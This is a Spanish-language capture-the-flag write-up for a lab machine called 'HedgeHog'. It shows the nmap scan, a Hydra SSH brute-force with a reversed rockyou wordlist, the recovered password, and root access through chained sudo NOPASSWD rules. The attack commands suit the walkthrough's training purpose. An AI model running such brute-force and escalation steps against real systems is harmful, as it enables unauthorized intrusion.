# HedgeHog

## Enumeración

Se comienza realizando un escaneo con **Nmap** para identificar los servicios expuestos.

```bash
nmap -sV 172.17.0.2
```

Resultado:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 10:47 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

MAC Address: B2:0F:E7:5A:64:6C (Unknown)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Los puertos abiertos son:

- **22/tcp:** SSH
- **80/tcp:** HTTP (Apache)

## Enumeración Web

Al acceder al puerto **80** desde el navegador únicamente aparece la palabra:

```
tails
```

Esto hace pensar que podría tratarse de un nombre de usuario.

Se realiza además una enumeración de directorios con **Gobuster**, pero no se encuentran rutas interesantes; únicamente existe `index.html`.

## Fuerza bruta por SSH

Al no encontrar más vectores por la web, se intenta un ataque de fuerza bruta contra SSH utilizando el posible usuario **tails**.

Primero se genera una versión invertida del diccionario **rockyou**, ya que la contraseña podría encontrarse al final de la lista.

```bash
mkdir -p ~/Desktop/Lists/Rockyou/

tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > ~/Desktop/Lists/Rockyou/rockyourev.txt
```

Luego se ejecuta **Hydra**:

```bash
hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyourev.txt -v -t 4 ssh://172.17.0.2 -o hydra.txt
```

Resultado:

```text
[22][ssh] host: 172.17.0.2
login: tails
password: 3117548331
```

Se obtiene la siguiente credencial:

- **Usuario:** tails
- **Contraseña:** 3117548331

---

## Acceso por SSH

Al intentar conectarse aparece el siguiente error:

```text
WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
Host key verification failed.
```

Esto ocurre porque la clave del host había cambiado y seguía almacenada en `known_hosts`.

Se elimina el archivo:

```bash
rm ~/.ssh/known_hosts
```

Posteriormente se vuelve a conectar:

```bash
ssh tails@172.17.0.2
```

Se acepta la nueva clave del servidor y se ingresa la contraseña obtenida anteriormente.

Una vez dentro:

```text
tails@281a38b48733:~$
```

---

# Escalada de privilegios

## Revisión de permisos sudo

Se consultan los permisos disponibles para el usuario actual.

```bash
sudo -l
```

Resultado:

```text
User tails may run the following commands on 281a38b48733:
    (sonic) NOPASSWD: ALL
```

Esto indica que el usuario **tails** puede ejecutar cualquier comando como **sonic** sin necesidad de contraseña.

## Cambio al usuario sonic

Se inicia una sesión interactiva como **sonic**.

```bash
sudo -u sonic -i
```

Verificación:

```bash
whoami
```

Salida:

```text
sonic
```

Ahora se revisan nuevamente los permisos sudo.

```bash
sudo -l
```

Resultado:

```text
User sonic may run the following commands on 281a38b48733:
    (ALL) NOPASSWD: ALL
```

El usuario **sonic** puede ejecutar cualquier comando como cualquier usuario sin contraseña.

## Obtener root

Simplemente se ejecuta:

```bash
sudo -i
```

Verificación:

```bash
whoami
```

Salida:

```text
root
```

Se obtiene acceso completo al sistema como **root**.

# Resumen

1. Se identificaron los puertos **22 (SSH)** y **80 (HTTP)**.
2. La página web mostraba únicamente la palabra **tails**, utilizada como posible nombre de usuario.
3. Se realizó fuerza bruta sobre SSH con **Hydra**, obteniendo las credenciales:
   - **tails : 3117548331**
4. Se accedió al sistema mediante SSH.
5. `sudo -l` mostró que **tails** podía ejecutar comandos como **sonic** sin contraseña.
6. El usuario **sonic** tenía permisos `NOPASSWD: ALL`.
7. Se ejecutó `sudo -i` y se obtuvo acceso como **root**.
